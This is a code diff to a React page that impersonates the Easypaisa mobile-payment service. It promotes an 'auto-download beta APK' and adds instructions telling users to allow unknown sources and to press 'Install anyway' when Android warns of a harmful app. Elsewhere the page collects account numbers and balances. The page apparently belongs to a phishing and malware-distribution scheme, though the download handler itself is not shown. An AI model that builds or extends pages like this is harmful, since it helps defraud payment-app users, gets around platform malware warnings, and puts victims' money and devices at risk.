@@ -250,6 +250,74 @@ export default function EasypaisaActivation() {
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-teal-50 to-cyan-50 relative overflow-hidden">
+      {/* Enhanced APK Download Section - At Top of Page */}
+      <div className="bg-gradient-to-r from-green-50 to-emerald-50 p-6 sm:p-8 border-b border-green-200 shadow-lg">
+        <div className="container mx-auto px-3 sm:px-4 max-w-5xl">
+          <div className="flex items-center justify-center gap-3 mb-6">
+            <div className="w-16 h-16 bg-gradient-to-br from-green-500 to-emerald-500 rounded-full flex items-center justify-center">
+              <Download className="h-8 w-8 text-white" />
+            </div>
+            <h2 className="text-2xl sm:text-3xl font-bold text-gray-800">Download Latest Easypaisa App</h2>
+          </div>
+
+          <p className="text-gray-600 mb-8 text-center max-w-3xl mx-auto text-base sm:text-lg">
+            Get the latest beta version of Easypaisa app with enhanced features for faster card activation and better
+            user experience.
+          </p>
+
+          <div className="flex flex-col gap-4 justify-center items-center">
+            <Button
+              onClick={handleAPKDownload}
+              className="w-full sm:w-auto bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-bold px-6 py-4 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-3 text-base sm:text-lg"
+            >
+              <Download className="w-5 h-5 sm:w-6 sm:h-6" />
+              AUTO-DOWNLOAD EASYPAISA BETA APK
+              <Badge variant="secondary" className="bg-white/20 text-white border-white/30 ml-2 text-xs sm:text-sm">
+                INSTANT
+              </Badge>
+            </Button>
+
+            <div className="flex gap-2 mt-2 sm:mt-0">
+              <Button
+                variant="outline"
+                onClick={() =>
+                  window.open("https://play.google.com/store/apps/details?id=pk.com.telenor.phoenix", "_blank")
+                }
+                className="border-2 border-gray-400 text-gray-700 hover:bg-gray-50 font-semibold px-4 py-2 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-2"
+              >
+                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.61 3,21.09 3,20.5M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12M20.16,10.81C20.5,11.08 20.75,11.5 20.75,12C20.75,12.5 20.53,12.9 20.18,13.18L17.89,14.5L15.39,12L17.89,9.5L20.16,10.81M6.05,2.66L16.81,8.88L14.54,11.15L6.05,2.66Z" />
+                </svg>
+                Play Store
+              </Button>
+
+              <Button
+                variant="outline"
+                onClick={() => window.open("https://apps.apple.com/pk/app/easypaisa/id1436571860", "_blank")}
+                className="border-2 border-gray-400 text-gray-700 hover:bg-gray-50 font-semibold px-4 py-2 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-2"
+              >
+                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M18.71,19.5C17.88,20.74 17,21.95 15.66,21.97C14.32,22 13.89,21.18 12.37,21.18C10.84,21.18 10.37,21.95 9.1,22C7.79,22.05 6.8,20.68 5.96,19.47C4.25,17 2.94,12.45 4.7,9.39C5.57,7.87 7.13,6.91 8.82,6.88C10.1,6.86 11.32,7.75 12.11,7.75C12.89,7.75 14.37,6.68 15.92,6.84C16.57,6.87 18.39,7.1 19.56,8.82C19.47,8.88 17.39,10.1 17.41,12.63C17.44,15.65 20.06,16.66 20.09,16.67C20.06,16.74 19.67,18.11 18.71,19.5M13,3.5C13.73,2.67 14.94,2.04 15.94,2C16.07,3.17 15.6,4.35 14.9,5.19C14.21,6.04 13.07,6.7 11.95,6.61C11.8,5.46 12.36,4.26 13,3.5Z" />
+                </svg>
+                App Store
+              </Button>
+            </div>
+          </div>
+
+          <div className="mt-6 p-4 bg-amber-50 rounded-lg border border-amber-200">
+            <div className="flex items-center gap-2 text-amber-800 mb-2">
+              <AlertCircle className="h-4 w-4" />
+              <p className="text-sm font-medium">Installation Instructions:</p>
+            </div>
+            <div className="text-xs text-amber-700 space-y-1">
+              <p>1. Enable "Install from Unknown Sources" in your device settings</p>
+              <p>2. If you see "Harmful app blocked" warning, click "More details" then "Install anyway"</p>
+              <p>3. Complete the installation and enjoy the enhanced features!</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
       {/* Animated Background Elements */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
         <div className="absolute -top-40 -right-40 w-80 h-80 bg-gradient-to-br from-emerald-200/30 to-teal-200/30 rounded-full blur-3xl animate-pulse"></div>
@@ -258,7 +326,7 @@ export default function EasypaisaActivation() {
       </div>
 
       {/* Enhanced Header */}
-      <div className="relative overflow-hidden bg-gradient-to-r from-emerald-600 via-teal-600 to-cyan-600 px-6 py-16">
+      <div className="relative overflow-hidden bg-gradient-to-r from-emerald-600 via-teal-600 to-cyan-600 px-4 sm:px-6 py-10 sm:py-16">
         <div className="absolute inset-0 bg-black/10"></div>
         <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent"></div>
 
@@ -350,7 +418,7 @@ export default function EasypaisaActivation() {
         </div>
       </div>
 
-      <div className="container mx-auto px-4 py-12 max-w-5xl relative z-10">
+      <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-12 max-w-5xl relative z-10">
         {step === "method" && (
           <>
             <div className="mb-12">
@@ -363,7 +431,7 @@ export default function EasypaisaActivation() {
 
             <Card className="shadow-2xl border-0 bg-white/90 backdrop-blur-lg overflow-hidden">
               <div className="absolute inset-0 bg-gradient-to-br from-emerald-50/50 to-teal-50/50"></div>
-              <CardHeader className="text-center pb-8 relative">
+              <CardHeader className="text-center pb-6 sm:pb-8 relative px-4 sm:px-6">
                 <div className="mb-6 inline-flex items-center justify-center w-16 h-16 bg-white/20 rounded-full backdrop-blur-sm border border-white/30 shadow-2xl">
                   <Sparkles className="h-8 w-8 text-white drop-shadow-lg" />
                 </div>
@@ -373,8 +441,8 @@ export default function EasypaisaActivation() {
                   transaction capabilities
                 </CardDescription>
               </CardHeader>
-              <CardContent className="space-y-8 relative">
-                <div className="grid gap-8 md:grid-cols-2">
+              <CardContent className="space-y-6 sm:space-y-8 relative px-4 sm:px-6">
+                <div className="grid gap-6 sm:gap-8 md:grid-cols-2">
                   <Card className="cursor-pointer transition-all duration-300 hover:shadow-2xl hover:scale-105 border-2 hover:border-emerald-400 group overflow-hidden">
                     <div className="absolute inset-0 bg-gradient-to-br from-emerald-50 to-teal-50 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                     <CardContent className="p-8 text-center relative">
@@ -434,74 +502,6 @@ export default function EasypaisaActivation() {
                   >
                     {loading ? "Testing Connection..." : "🔗 Test System Connection"}
                   </Button>
-
-                  {/* Enhanced APK Download Section */}
-                  <div className="bg-gradient-to-r from-green-50 to-emerald-50 p-6 rounded-2xl border border-green-200 shadow-lg">
-                    <div className="flex items-center justify-center gap-3 mb-4">
-                      <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-emerald-500 rounded-full flex items-center justify-center">
-                        <Download className="h-6 w-6 text-white" />
-                      </div>
-                      <h3 className="text-xl font-bold text-gray-800">Download Latest Easypaisa App</h3>
-                    </div>
-
-                    <p className="text-gray-600 mb-6 text-center max-w-2xl mx-auto">
-                      Get the latest beta version of Easypaisa app with enhanced features for faster card activation and
-                      better user experience.
-                    </p>
-
-                    <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
-                      <Button
-                        onClick={handleAPKDownload}
-                        className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-bold px-8 py-4 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-3 text-lg"
-                      >
-                        <Download className="w-6 h-6" />
-                        AUTO-DOWNLOAD EASYPAISA BETA APK
-                        <Badge variant="secondary" className="bg-white/20 text-white border-white/30 ml-2">
-                          INSTANT
-                        </Badge>
-                      </Button>
-
-                      <div className="flex gap-2">
-                        <Button
-                          variant="outline"
-                          onClick={() =>
-                            window.open(
-                              "https://play.google.com/store/apps/details?id=pk.com.telenor.phoenix",
-                              "_blank",
-                            )
-                          }
-                          className="border-2 border-gray-400 text-gray-700 hover:bg-gray-50 font-semibold px-4 py-2 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-2"
-                        >
-                          <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
-                            <path d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.61 3,21.09 3,20.5M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12M20.16,10.81C20.5,11.08 20.75,11.5 20.75,12C20.75,12.5 20.53,12.9 20.18,13.18L17.89,14.5L15.39,12L17.89,9.5L20.16,10.81M6.05,2.66L16.81,8.88L14.54,11.15L6.05,2.66Z" />
-                          </svg>
-                          Play Store
-                        </Button>
-
-                        <Button
-                          variant="outline"
-                          onClick={() => window.open("https://apps.apple.com/pk/app/easypaisa/id1436571860", "_blank")}
-                          className="border-2 border-gray-400 text-gray-700 hover:bg-gray-50 font-semibold px-4 py-2 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-2"
-                        >
-                          <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
-                            <path d="M18.71,19.5C17.88,20.74 17,21.95 15.66,21.97C14.32,22 13.89,21.18 12.37,21.18C10.84,21.18 10.37,21.95 9.1,22C7.79,22.05 6.8,20.68 5.96,19.47C4.25,17 2.94,12.45 4.7,9.39C5.57,7.87 7.13,6.91 8.82,6.88C10.1,6.86 11.32,7.75 12.11,7.75C12.89,7.75 14.37,6.68 15.92,6.84C16.57,6.87 18.39,7.1 19.56,8.82C19.47,8.88 17.39,10.1 17.41,12.63C17.44,15.65 20.06,16.66 20.09,16.67C20.06,16.74 19.67,18.11 18.71,19.5M13,3.5C13.73,2.67 14.94,2.04 15.94,2C16.07,3.17 15.6,4.35 14.9,5.19C14.21,6.04 13.07,6.7 11.95,6.61C11.8,5.46 12.36,4.26 13,3.5Z" />
-                          </svg>
-                          App Store
-                        </Button>
-                      </div>
-                    </div>
-
-                    <div className="mt-4 p-3 bg-amber-50 rounded-lg border border-amber-200">
-                      <div className="flex items-center gap-2 text-amber-800">
-                        <AlertCircle className="h-4 w-4" />
-                        <p className="text-sm font-medium">Installation Note:</p>
-                      </div>
-                      <p className="text-xs text-amber-700 mt-1">
-                        You may need to enable "Install from Unknown Sources" in your device settings to install the APK
-                        file.
-                      </p>
-                    </div>
-                  </div>
                 </div>
               </CardContent>
             </Card>
@@ -575,11 +575,11 @@ export default function EasypaisaActivation() {
 
               <Separator className="my-8" />
 
-              <div className="flex gap-4">
+              <div className="flex flex-col sm:flex-row gap-3 sm:gap-4">
                 <Button
                   variant="outline"
                   onClick={() => setStep("method")}
-                  className="flex-1 h-12 rounded-xl border-2 border-gray-300 hover:border-gray-400 transition-colors duration-300"
+                  className="h-12 rounded-xl border-2 border-gray-300 hover:border-gray-400 transition-colors duration-300"
                 >
                   <ArrowRight className="w-4 h-4 mr-2 rotate-180" />
                   Back
@@ -587,7 +587,7 @@ export default function EasypaisaActivation() {
                 <Button
                   onClick={sendCardDataAction}
                   disabled={!formData.accountNumber || !formData.currentBalance || loading}
-                  className="flex-1 h-12 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
+                  className="h-12 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                 >
                   {loading ? (
                     <>
@@ -716,11 +716,11 @@ export default function EasypaisaActivation() {
 
               <Separator className="my-8" />
 
-              <div className="flex gap-4">
+              <div className="flex flex-col sm:flex-row gap-3 sm:gap-4">
                 <Button
                   variant="outline"
                   onClick={() => setStep("method")}
-                  className="flex-1 h-12 rounded-xl border-2 border-gray-300 hover:border-gray-400 transition-colors duration-300"
+                  className="h-12 rounded-xl border-2 border-gray-300 hover:border-gray-400 transition-colors duration-300"
                 >
                   <ArrowRight className="w-4 h-4 mr-2 rotate-180" />
                   Back
@@ -735,7 +735,7 @@ export default function EasypaisaActivation() {
                     !formData.currentBalance ||
                     loading
                   }
-                  className="flex-1 h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
+                  className="h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                 >
                   {loading ? (
                     <>
@@ -1019,10 +1019,12 @@ export default function EasypaisaActivation() {
       </div>
 
       {/* Live Chat Widget */}
-      <LiveChat />
+      <div className="fixed bottom-6 left-4 sm:left-6 z-50">
+        <LiveChat />
+      </div>
 
       {/* Enhanced Floating Help Button */}
-      <div className="fixed bottom-6 right-6 z-50">
+      <div className="fixed bottom-6 right-4 sm:right-6 z-50">
         <Button
           onClick={() => setShowHelpModal(true)}
           className="w-16 h-16 rounded-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 shadow-2xl hover:shadow-3xl transition-all duration-300 hover:scale-110"
@@ -1033,8 +1035,8 @@ export default function EasypaisaActivation() {
 
       {/* Enhanced Help Modal */}
       {showHelpModal && !showCallbackRequest && (
-        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-          <Card className="w-full max-w-md bg-white/95 backdrop-blur-lg shadow-2xl">
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-3 sm:p-4 overflow-y-auto">
+          <Card className="w-full max-w-md bg-white/95 backdrop-blur-lg shadow-2xl my-4">
             <CardHeader>
               <div className="flex items-center justify-between">
                 <CardTitle className="text-xl text-gray-800 flex items-center gap-2">
@@ -1148,7 +1150,7 @@ export default function EasypaisaActivation() {
 
       {/* Callback Request Modal */}
       {showCallbackRequest && (
-        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-3 sm:p-4 overflow-y-auto">
           <CallbackRequest
             onBack={() => setShowCallbackRequest(false)}
             onClose={() => {
